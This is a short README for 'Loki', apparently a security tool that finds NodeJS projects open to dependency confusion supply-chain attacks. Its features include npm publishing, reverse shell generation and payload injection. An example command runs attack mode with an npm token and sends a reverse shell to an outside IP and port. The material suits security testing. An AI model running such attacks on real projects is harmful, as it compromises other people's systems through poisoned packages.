<div align="center">
    <p> <img src="https://xh4h.com/uploads/loki.png" alt="Discord.jl"/> </p>
</div>

**Loki** helps identifying `NodeJS` projects that are vulnerable to **Dependency Confusion supply chain** attacks.

## Features

* Dependency scanning
* npmjs package publishing
* Configurable reverse shell generation
* Payload injection in vulnerable projects
* Attack mode (PoC after successful payload injection)
* Inspector mode (display hash of commit that introduced the vulnerable package if the directory to scan is a git repository)


## Usage
```
$ loki [options]

Options
--directory   -d   Path to directory to scan
--entrypoint  -e   Path to file to execute if directory is vulnerable (defaults to index.js)
--inspect     -i   Enable inspector mode
--accesstoken -a   Access token for npmjs.com
--attack           Whether to attack the project
--host             Host IP where the reverse shell lister is running (defaults to localhost)
--port             Port where the reverse shell lister is running (defaults to 1456)
```

## Example
```sh
$ loki -d ./my-project -a npm_gf56nF46Js4AcaAs31MadKW3L4k --atack --host 17.1.234.33 --port 2030
```
<div align="center">
    <p> <img src="https://xh4h.com/uploads/DisfiguredMediumorchid_Condor_Nf8VctBu1wAmJWdW.gif"/> </p>
</div>
